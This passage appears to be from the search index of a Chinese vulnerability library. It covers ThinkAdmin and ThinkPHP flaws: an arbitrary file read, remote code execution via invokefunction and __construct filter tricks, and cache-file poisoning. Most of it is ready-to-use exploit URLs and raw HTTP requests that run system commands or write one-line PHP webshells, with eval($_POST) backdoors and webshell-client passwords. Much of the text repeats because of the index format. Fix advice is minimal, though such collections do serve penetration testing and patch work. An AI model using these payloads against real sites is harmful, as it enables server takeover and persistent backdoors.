Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 22 rules=%5B%22.%2F%22%5D ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/\u5fae\u4fe1\u56fe\u7247_20200921085600.jpg) \u83b7\u53d6\u7248\u672c\u4fe1\u606f: https://xxxxx/admin.html?s=admin/api.Update/version ```2\u3001\u2f42\u4ef6\u8bfb\u53d6,\u540e\u2faf\u90a3\u2f00\u4e32\u662fUTF8\u5b57\u7b26\u4e32\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002\u8ba1\u7b97\u2f45\u5f0f\u5728Update.php\u4e2d\u7684\u52a0\u5bc6\u51fd\u6570\u3002 /admin.html? s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34","title":"POC:"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkadmin/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/#_4","text":"\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4fee\u590d\u76f8\u5173\u95ee\u9898\uff0c\u8bf7\u53d7\u5f71\u54cd\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u5230\u5b89\u5168\u7248\u672c","title":"\u4fee\u590d\u65b9\u6848:"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/","text":"\u76ee\u5f55 \u00b6 \u4e00\u3001\u63a7\u5236\u5668\u540d\u5f15\u8d77\u7684RCE \u00b6 \u4e8c\u3001\u6838\u5fc3\u7c7bRequests\u5f15\u8d77\u7684RCE \u00b6 \u4e00\u3001\u63a7\u5236\u5668\u540d\u5f15\u8d77\u7684RCE \u00b6 \u516c\u5f00\u65f6\u95f4\uff1a \u00b6 2018/12/09 \u5f71\u54cd\u7248\u672c\uff1a \u00b6 ThinkPHP 5.0\u7cfb\u5217 < 5.0.23 ThinkPHP 5.1\u7cfb\u5217 < 5.1.31 poc: http://127.0.0.1/tp5022/public/index.php?s=index/\\think\\app/invokefunction&function=phpinfo&vars[0]=1 exp: http://127.0.0.1/tp5022/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami shell: http://127.0.0.1/tp5022/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=a.php&vars[1][]=<?php eval(@$_POST['a']);?>#shell\u5730\u5740http://127.0.0.1/tp5022/public/a.php \u4e8c\u3001\u6838\u5fc3\u7c7bRequests\u5f15\u8d77\u7684RCE \u00b6 \u516c\u5f00\u65f6\u95f4\uff1a \u00b6 2019/01/11 \u5f71\u54cd\u7248\u672c\uff1a \u00b6 5.0\u5168\u7cfb\u5217\uff0c\u5177\u4f53\u5982\u4e0b \u7248\u672c\u540d \u662f\u5426\u53ef\u88ab\u653b\u51fb \u653b\u51fb\u6761\u4ef6 5.0.0 \u5426 \u65e0 5.0.1 \u5426 \u65e0 5.0.2 \u5426 \u65e0 5.0.3 \u5426 \u65e0 5.0.4 \u5426 \u65e0 5.0.5 \u5426 \u65e0 5.0.6 \u5426 \u65e0 5.0.7 \u5426 \u65e0 5.0.8 \u662f \u65e0\u9700\u5f00\u542fdebug 5.0.9 \u662f \u65e0\u9700\u5f00\u542fdebug 5.0.10 \u662f \u65e0\u9700\u5f00\u542fdebug 5.0.11 \u662f \u65e0\u9700\u5f00\u542fdebug 5.0.12 \u662f \u65e0\u9700\u5f00\u542fdebug 5.0.13 \u662f \u9700\u5f00\u542fdebug 5.0.14 \u662f \u9700\u5f00\u542fdebug 5.0.15 \u662f \u9700\u5f00\u542fdebug 5.0.16 \u662f \u9700\u5f00\u542fdebug 5.0.17 \u662f \u9700\u5f00\u542fdebug 5.0.18 \u662f \u9700\u5f00\u542fdebug 5.0.19 \u662f \u9700\u5f00\u542fdebug 5.0.20 \u5426 \u65e0 5.0.21 \u662f \u9700\u5f00\u542fdebug 5.0.22 \u662f \u9700\u5f00\u542fdebug 5.0.23 \u662f \u9700\u5f00\u542fdebug 5.0.24 \u5426 \u65e0 exp\uff1a \u7248\u672c\u53f7\uff1a5.0.8~5.0.19s=whoami&_method=__construct&filter&filter=system\u7248\u672c\u53f7\uff1a5.0.20~5.0.23_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami\u6216_method=__construct&filter[]=system&server[REQUEST_METHOD]=whoami \u5177\u4f53\u8bf7\u6c42\u5305\u5982\u4e0b\uff0c\u7559\u610f\u4e0b Content-Type: application/x-www-form-urlencoded POST /tp5022/public/ HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: think_var=zh-cn Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 65 _method=__construct&filter[]=system&server[REQUEST_METHOD]=whoami","title":"\u76ee\u5f55"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/#_1","text":"","title":"\u76ee\u5f55"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/#rce","text":"","title":"\u4e00\u3001\u63a7\u5236\u5668\u540d\u5f15\u8d77\u7684RCE"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/#requestsrce","text":"","title":"\u4e8c\u3001\u6838\u5fc3\u7c7bRequests\u5f15\u8d77\u7684RCE"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/#rce_1","text":"","title":"\u4e00\u3001\u63a7\u5236\u5668\u540d\u5f15\u8d77\u7684RCE"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/#_2","text":"2018/12/09","title":"\u516c\u5f00\u65f6\u95f4\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/#_3","text":"ThinkPHP 5.0\u7cfb\u5217 < 5.0.23 ThinkPHP 5.1\u7cfb\u5217 < 5.1.31 poc: http://127.0.0.1/tp5022/public/index.php?s=index/\\think\\app/invokefunction&function=phpinfo&vars[0]=1 exp: http://127.0.0.1/tp5022/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami shell: http://127.0.0.1/tp5022/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=a.php&vars[1][]=<?php eval(@$_POST['a']);?>#shell\u5730\u5740http://127.0.0.1/tp5022/public/a.php","title":"\u5f71\u54cd\u7248\u672c\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/#requestsrce_1","text":"","title":"\u4e8c\u3001\u6838\u5fc3\u7c7bRequests\u5f15\u8d77\u7684RCE"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/#_4","text":"2019/01/11","title":"\u516c\u5f00\u65f6\u95f4\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/#_5","text":"5.0\u5168\u7cfb\u5217\uff0c\u5177\u4f53\u5982\u4e0b \u7248\u672c\u540d \u662f\u5426\u53ef\u88ab\u653b\u51fb \u653b\u51fb\u6761\u4ef6 5.0.0 \u5426 \u65e0 5.0.1 \u5426 \u65e0 5.0.2 \u5426 \u65e0 5.0.3 \u5426 \u65e0 5.0.4 \u5426 \u65e0 5.0.5 \u5426 \u65e0 5.0.6 \u5426 \u65e0 5.0.7 \u5426 \u65e0 5.0.8 \u662f \u65e0\u9700\u5f00\u542fdebug 5.0.9 \u662f \u65e0\u9700\u5f00\u542fdebug 5.0.10 \u662f \u65e0\u9700\u5f00\u542fdebug 5.0.11 \u662f \u65e0\u9700\u5f00\u542fdebug 5.0.12 \u662f \u65e0\u9700\u5f00\u542fdebug 5.0.13 \u662f \u9700\u5f00\u542fdebug 5.0.14 \u662f \u9700\u5f00\u542fdebug 5.0.15 \u662f \u9700\u5f00\u542fdebug 5.0.16 \u662f \u9700\u5f00\u542fdebug 5.0.17 \u662f \u9700\u5f00\u542fdebug 5.0.18 \u662f \u9700\u5f00\u542fdebug 5.0.19 \u662f \u9700\u5f00\u542fdebug 5.0.20 \u5426 \u65e0 5.0.21 \u662f \u9700\u5f00\u542fdebug 5.0.22 \u662f \u9700\u5f00\u542fdebug 5.0.23 \u662f \u9700\u5f00\u542fdebug 5.0.24 \u5426 \u65e0 exp\uff1a \u7248\u672c\u53f7\uff1a5.0.8~5.0.19s=whoami&_method=__construct&filter&filter=system\u7248\u672c\u53f7\uff1a5.0.20~5.0.23_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami\u6216_method=__construct&filter[]=system&server[REQUEST_METHOD]=whoami \u5177\u4f53\u8bf7\u6c42\u5305\u5982\u4e0b\uff0c\u7559\u610f\u4e0b Content-Type: application/x-www-form-urlencoded POST /tp5022/public/ HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: think_var=zh-cn Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 65 _method=__construct&filter[]=system&server[REQUEST_METHOD]=whoami","title":"\u5f71\u54cd\u7248\u672c\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/ThinkPHP_3.2.3-5.0.10_%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7/","text":"ThinkPHP_3.2.3-5.0.10_\u7f13\u5b58\u51fd\u6570\u8bbe\u8ba1\u7f3a\u9677 \u00b6 Affected Version \u00b6 ThinkPHP_3.2.3-5.0.10 PoC \u00b6 \u8be5\u6f0f\u6d1e\u590d\u73b0\u8d77\u6765\u6bd4\u8f83\u590d\u6742\uff0c\u867d\u7136\u9700\u8981\u540c\u65f6\u6ee1\u8db3\u5f88\u591a\u6761\u4ef6\u624d\u53ef\u4ee5\u5bfc\u81f4GetShell\uff0c\u4e0d\u8fc7\u98ce\u9669\u786e\u5b9e\u5b58\u5728\uff0c\u5bf9\u4e8e\u9ed1\u5ba2\u6765\u8bf4\u4efb\u4f55\u4e00\u70b9\u7ec6\u5fae\u7684\u98ce\u9669\u90fd\u6709\u53ef\u80fd\u662f\u6574\u4e2a\u653b\u51fb\u94fe\u6761\u4e2d\u91cd\u8981\u7684\u4e00\u73af\u3002 \u6839\u636e\u5148\u77e5\u8bba\u575b\u4e0adalao\u7684\u8ba8\u8bba\uff0c\u89e6\u53d1\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u81f3\u5c11\u9700\u8981\u540c\u65f6\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\uff1a \u5f00\u542f\u7f13\u5b58\u529f\u80fd \u7f13\u5b58\u6587\u4ef6\u6240\u5728\u76ee\u5f55\u53ef\u4ee5\u4ece\u6d4f\u89c8\u5668\u76f4\u63a5\u8bbf\u95ee \u9700\u8981\u80fd\u591f\u731c\u89e3\u51fa\u7f13\u5b58\u7684\u6587\u4ef6\u540d\uff08\u6587\u4ef6\u540d\u751f\u6210\u6709\u4e00\u5b9a\u89c4\u5f8b\uff09 \u540c\u65f6\u53ef\u4ee5\u63a7\u5236\u7f13\u5b58\u6587\u4ef6\u91cc\u7684\u5185\u5bb9\uff08\u6bd4\u5982\u901a\u8fc7\u5199\u5165\u5230\u6570\u636e\u5e93\u8fdb\u800c\u751f\u6210\u7f13\u5b58\u6587\u4ef6\uff09 \u4e2a\u4eba\u5728\u590d\u73b0\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u65f6\u5019\u53d1\u73b0 5.0.x \u7248\u672c\u7684 TP \u5e76\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\u5230\u7f13\u5b58\u6587\u4ef6\u6240\u5728\u7684\u76ee\u5f55\uff0c\u6240\u4ee5\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0d\u80fd\u89e6\u53d1\u8be5\u6f0f\u6d1e\u3002\u5728 3.2.x \u7248\u672c\u662f\u53ef\u4ee5\u76f4\u63a5\u4ece\u6d4f\u89c8\u5668\u8bbf\u95ee\u5230\u7f13\u5b58\u6587\u4ef6\u7684\u3002 \u4e3a\u4e86\u89e6\u53d1TP 3.2.3 Demo \u7684 GetShell \u6f0f\u6d1e\uff0c\u5148\u53d1\u8d77\u5982\u4e0b\u8bf7\u6c42\uff1a http://localhost/tp3.2.3/index.php/Home/Index/get?id=%0D%0Aeval($_POST[x]);// \u4e0b\u4e00\u6b65\u9700\u8981\u5bf9\u7f13\u5b58\u7684\u6587\u4ef6\u540d\u8fdb\u884c\u731c\u89e3\uff0c\u6587\u4ef6\u540d\u7684\u751f\u6210\u89c4\u5219\u662f\u7f13\u5b58\u7684key\u7684MD5\uff0c\u6240\u4ee5\u9ed1\u76d2\u60c5\u51b5\u4e0b\u53ef\u4ee5\u5148\u7b97\u4e00\u4e9b\u5173\u952e\u8bcd\u7684MD5\uff0c\u7136\u540e\u6279\u91cfHEAD\u8bf7\u6c42\uff0c\u53d1\u73b0\u54cd\u5e94200\u5219\u8bf4\u660e\u5b58\u5728\u8fd9\u4e2a\u7f13\u5b58\u6587\u4ef6\uff0c\u6216\u8005\u7ed3\u5408\u6e90\u4ee3\u7801\u6cc4\u9732\u6f0f\u6d1e\u8fdb\u884c\u5229\u7528\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u4ece\u6e90\u7801\u6587\u4ef6\u770b\u5230\u751f\u6210\u7684\u6587\u4ef6\uff1a \u6587\u4ef6\u540d \u4e5f\u6b63\u662f \u7f13\u5b58 key \uff08name\uff09 \u7684MD5 \u503c\uff1a md5(name,32) = b068931cc450442b63f5b3d276ea4297 \u6700\u540e\uff0c\u53ef\u4ee5\u770b\u5230 b068931cc450442b63f5b3d276ea4297.php \u7684 \u5185\u5bb9\u4e3a\u4e4b\u524d\u5199\u8fdb\u53bb\u7684\u4e00\u53e5\u8bdd\u6728\u9a6c\uff1a References \u00b6 https://xianzhi.aliyun.com/forum/topic/99 \uff08\u6f0f\u6d1e\u8be6\u60c5\uff09 http://www.thinkphp.cn/topic/51162.html \uff08\u4fee\u590d\u65b9\u6848\uff09","title":"ThinkPHP_3.2.3-5.0.10_\u7f13\u5b58\u51fd\u6570\u8bbe\u8ba1\u7f3a\u9677"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/ThinkPHP_3.2.3-5.0.10_%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7/#thinkphp_323-5010_","text":"","title":"ThinkPHP_3.2.3-5.0.10_\u7f13\u5b58\u51fd\u6570\u8bbe\u8ba1\u7f3a\u9677"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/ThinkPHP_3.2.3-5.0.10_%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7/#affected-version","text":"ThinkPHP_3.2.3-5.0.10","title":"Affected Version"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/ThinkPHP_3.2.3-5.0.10_%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7/#poc","text":"\u8be5\u6f0f\u6d1e\u590d\u73b0\u8d77\u6765\u6bd4\u8f83\u590d\u6742\uff0c\u867d\u7136\u9700\u8981\u540c\u65f6\u6ee1\u8db3\u5f88\u591a\u6761\u4ef6\u624d\u53ef\u4ee5\u5bfc\u81f4GetShell\uff0c\u4e0d\u8fc7\u98ce\u9669\u786e\u5b9e\u5b58\u5728\uff0c\u5bf9\u4e8e\u9ed1\u5ba2\u6765\u8bf4\u4efb\u4f55\u4e00\u70b9\u7ec6\u5fae\u7684\u98ce\u9669\u90fd\u6709\u53ef\u80fd\u662f\u6574\u4e2a\u653b\u51fb\u94fe\u6761\u4e2d\u91cd\u8981\u7684\u4e00\u73af\u3002 \u6839\u636e\u5148\u77e5\u8bba\u575b\u4e0adalao\u7684\u8ba8\u8bba\uff0c\u89e6\u53d1\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u81f3\u5c11\u9700\u8981\u540c\u65f6\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\uff1a \u5f00\u542f\u7f13\u5b58\u529f\u80fd \u7f13\u5b58\u6587\u4ef6\u6240\u5728\u76ee\u5f55\u53ef\u4ee5\u4ece\u6d4f\u89c8\u5668\u76f4\u63a5\u8bbf\u95ee \u9700\u8981\u80fd\u591f\u731c\u89e3\u51fa\u7f13\u5b58\u7684\u6587\u4ef6\u540d\uff08\u6587\u4ef6\u540d\u751f\u6210\u6709\u4e00\u5b9a\u89c4\u5f8b\uff09 \u540c\u65f6\u53ef\u4ee5\u63a7\u5236\u7f13\u5b58\u6587\u4ef6\u91cc\u7684\u5185\u5bb9\uff08\u6bd4\u5982\u901a\u8fc7\u5199\u5165\u5230\u6570\u636e\u5e93\u8fdb\u800c\u751f\u6210\u7f13\u5b58\u6587\u4ef6\uff09 \u4e2a\u4eba\u5728\u590d\u73b0\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u65f6\u5019\u53d1\u73b0 5.0.x \u7248\u672c\u7684 TP \u5e76\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\u5230\u7f13\u5b58\u6587\u4ef6\u6240\u5728\u7684\u76ee\u5f55\uff0c\u6240\u4ee5\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0d\u80fd\u89e6\u53d1\u8be5\u6f0f\u6d1e\u3002\u5728 3.2.x \u7248\u672c\u662f\u53ef\u4ee5\u76f4\u63a5\u4ece\u6d4f\u89c8\u5668\u8bbf\u95ee\u5230\u7f13\u5b58\u6587\u4ef6\u7684\u3002 \u4e3a\u4e86\u89e6\u53d1TP 3.2.3 Demo \u7684 GetShell \u6f0f\u6d1e\uff0c\u5148\u53d1\u8d77\u5982\u4e0b\u8bf7\u6c42\uff1a http://localhost/tp3.2.3/index.php/Home/Index/get?id=%0D%0Aeval($_POST[x]);// \u4e0b\u4e00\u6b65\u9700\u8981\u5bf9\u7f13\u5b58\u7684\u6587\u4ef6\u540d\u8fdb\u884c\u731c\u89e3\uff0c\u6587\u4ef6\u540d\u7684\u751f\u6210\u89c4\u5219\u662f\u7f13\u5b58\u7684key\u7684MD5\uff0c\u6240\u4ee5\u9ed1\u76d2\u60c5\u51b5\u4e0b\u53ef\u4ee5\u5148\u7b97\u4e00\u4e9b\u5173\u952e\u8bcd\u7684MD5\uff0c\u7136\u540e\u6279\u91cfHEAD\u8bf7\u6c42\uff0c\u53d1\u73b0\u54cd\u5e94200\u5219\u8bf4\u660e\u5b58\u5728\u8fd9\u4e2a\u7f13\u5b58\u6587\u4ef6\uff0c\u6216\u8005\u7ed3\u5408\u6e90\u4ee3\u7801\u6cc4\u9732\u6f0f\u6d1e\u8fdb\u884c\u5229\u7528\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u4ece\u6e90\u7801\u6587\u4ef6\u770b\u5230\u751f\u6210\u7684\u6587\u4ef6\uff1a \u6587\u4ef6\u540d \u4e5f\u6b63\u662f \u7f13\u5b58 key \uff08name\uff09 \u7684MD5 \u503c\uff1a md5(name,32) = b068931cc450442b63f5b3d276ea4297 \u6700\u540e\uff0c\u53ef\u4ee5\u770b\u5230 b068931cc450442b63f5b3d276ea4297.php \u7684 \u5185\u5bb9\u4e3a\u4e4b\u524d\u5199\u8fdb\u53bb\u7684\u4e00\u53e5\u8bdd\u6728\u9a6c\uff1a","title":"PoC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/ThinkPHP_3.2.3-5.0.10_%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7/#references","text":"https://xianzhi.aliyun.com/forum/topic/99 \uff08\u6f0f\u6d1e\u8be6\u60c5\uff09 http://www.thinkphp.cn/topic/51162.html \uff08\u4fee\u590d\u65b9\u6848\uff09","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 Thinkphp 2.X \u6f0f\u6d1ePOC \u00b6 /index.php?s=/index/index/xxx/${@phpinfo()} /index.php?s=/index/index/xxx/${@print(system($_POST[a]))} \u83dc\u5200\u8fde\u63a5,\u5bc6\u7801\u4e3aa\u3002","title":"Thinkphp 2.X RCE\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E/#_1","text":"Thinkphp 2.X","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E/#poc","text":"/index.php?s=/index/index/xxx/${@phpinfo()} /index.php?s=/index/index/xxx/${@print(system($_POST[a]))} \u83dc\u5200\u8fde\u63a5,\u5bc6\u7801\u4e3aa\u3002","title":"\u6f0f\u6d1ePOC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","text":"\u5b89\u88c5docker\u73af\u5883 \u00b6 \u70b9\u51fb\u67e5\u770b\u6559\u7a0b \u00b6 \u4e0b\u8f7dvulhub\u9879\u76ee \u00b6 \u9879\u76ee\u5730\u5740\uff1a https://github.com/vulhub/vulhub \u4e0b\u8f7d\u540e\u8fdb\u5165\u9879\u76ee\u76ee\u5f55\u4e0bthinkphp/2-rce\u76ee\u5f55\uff1a cd vunhub-master/thinkphp/2-rce \u5f00\u542f\u672c\u6b21\u6f0f\u6d1e\u73af\u5883\uff1a docker-compose up -d \u6d4f\u89c8\u5668\u8bbf\u95ee\u73af\u5883\u670d\u52a1\u5668**ip:8080** \u73af\u5883\u642d\u5efa\u5b8c\u6210\uff01 \u00b6","title":"Thinkphp 2.X RCE\u6f0f\u6d1e\u73af\u5883\u642d\u5efa"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#docker","text":"","title":"\u5b89\u88c5docker\u73af\u5883"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_1","text":"","title":"\u70b9\u51fb\u67e5\u770b\u6559\u7a0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#vulhub","text":"\u9879\u76ee\u5730\u5740\uff1a https://github.com/vulhub/vulhub \u4e0b\u8f7d\u540e\u8fdb\u5165\u9879\u76ee\u76ee\u5f55\u4e0bthinkphp/2-rce\u76ee\u5f55\uff1a cd vunhub-master/thinkphp/2-rce \u5f00\u542f\u672c\u6b21\u6f0f\u6d1e\u73af\u5883\uff1a docker-compose up -d \u6d4f\u89c8\u5668\u8bbf\u95ee\u73af\u5883\u670d\u52a1\u5668**ip:8080**","title":"\u4e0b\u8f7dvulhub\u9879\u76ee"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_2","text":"","title":"\u73af\u5883\u642d\u5efa\u5b8c\u6210\uff01"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 Thinkphp 3.2.3 \u6f0f\u6d1e\u4ea7\u751f\u6761\u4ef6 \u00b6 \u6b64\u7248\u672c\u9ed8\u8ba4\u7684\u7f13\u5b58\u5904\u7406\u673a\u5236\u4e2d\uff0c\u7f13\u5b58\u6587\u4ef6\u662f\u4e00\u4e2a\u53ef\u8bbf\u95ee\u7684.php\u6587\u4ef6\uff0c\u7f16\u7a0b\u4eba\u5458\u628a\u7528\u6237\u53ef\u63a7\u53c2\u6570\u5199\u5165\u7f13\u5b58\u5219\u4f1a\u4ea7\u751f\u6f0f\u6d1e\u3002 \u6f0f\u6d1e\u9a8c\u8bc1POC \u00b6 \u83b7\u53d6\u7528\u6237\u53ef\u63a7\u53c2\u6570\u5199\u5165\u7f13\u5b58 \u00b6 \u4f8b\uff1a <?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $a=I('post.a'); S('name',$a); } } \u7528\u6237\u4f20\u53c2\u6570\uff1a \u00b6 ?a=%0aeval($_POST['aaa']);%0a %0a\u4e3a\u6362\u884c\u7b26\uff0c\u9ed8\u8ba4\u5b58\u5165\u7f13\u5b58\u6587\u4ef6\u65f6\u7528\u6237\u53c2\u6570\u5b58\u5728\u4e8e\u6ce8\u91ca\u4e2d\u3002 \u5199\u5165\u7f13\u5b58\u6587\u4ef6\uff0c\u6587\u4ef6\u540d\u4e3amd5\u52a0\u5bc6 \u00b6 md5(name) \u6587\u4ef6\u9ed8\u8ba4\u8def\u5f84 \u00b6 <domain>/Application/Runtime/Temp/<md5>.php \u83dc\u5200\u8fde\u63a5 \u00b6 http://xxxxxxx/Application/Runtime/Temp/<md5>.php \u5bc6\u7801aaa","title":"Thinkphp 3.2.3 \u7f13\u5b58\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_1","text":"Thinkphp 3.2.3","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_2","text":"\u6b64\u7248\u672c\u9ed8\u8ba4\u7684\u7f13\u5b58\u5904\u7406\u673a\u5236\u4e2d\uff0c\u7f13\u5b58\u6587\u4ef6\u662f\u4e00\u4e2a\u53ef\u8bbf\u95ee\u7684.php\u6587\u4ef6\uff0c\u7f16\u7a0b\u4eba\u5458\u628a\u7528\u6237\u53ef\u63a7\u53c2\u6570\u5199\u5165\u7f13\u5b58\u5219\u4f1a\u4ea7\u751f\u6f0f\u6d1e\u3002","title":"\u6f0f\u6d1e\u4ea7\u751f\u6761\u4ef6"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#poc","text":"","title":"\u6f0f\u6d1e\u9a8c\u8bc1POC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_3","text":"\u4f8b\uff1a <?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $a=I('post.a'); S('name',$a); } }","title":"\u83b7\u53d6\u7528\u6237\u53ef\u63a7\u53c2\u6570\u5199\u5165\u7f13\u5b58"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_4","text":"?a=%0aeval($_POST['aaa']);%0a 